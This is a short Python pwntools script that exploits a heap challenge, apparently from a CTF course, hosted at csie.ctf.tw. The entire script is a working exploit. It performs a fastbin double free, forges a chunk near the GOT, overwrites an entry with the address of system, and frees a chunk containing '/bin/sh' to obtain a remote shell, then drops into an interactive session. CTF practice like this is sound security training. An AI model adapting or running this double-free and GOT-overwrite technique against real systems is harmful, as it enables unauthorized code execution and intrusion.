from pwn import *

host = '127.0.0.1'
port = 8888
host = 'csie.ctf.tw'
port = 10142
r = remote(host, port)

def allocate(size, data):
    r.recvuntil(':')
    r.sendline(b'1')
    r.recvuntil(':')
    r.sendline(str(size).encode())
    r.recvuntil(':')
    r.sendline(data)

def free(index):
    r.recvuntil(':')
    r.sendline(b'2')
    r.recvuntil(':')
    r.sendline(str(index).encode())

def exit():
    r.recvuntil(':')
    r.sendline(b'3')

allocate(0x50, b'a') #0
allocate(0x50, b'a') #1
allocate(0x50, b'a') #2

free(1)
free(2)
free(1)

fakechunk = 0x601ffa
allocate(0x50, p64(fakechunk)) #3
allocate(0x50, b'/bin/sh\x00') #4
allocate(0x50, b'a') #5

system = 0x4007d0
allocate(0x50, b'a'*0xe + p64(system)) #fakechunk
# allocate(0x50, b'/bin/sh\x00' + b'e'*3 + p64(system)) #fakechunk
free(4)

r.interactive()
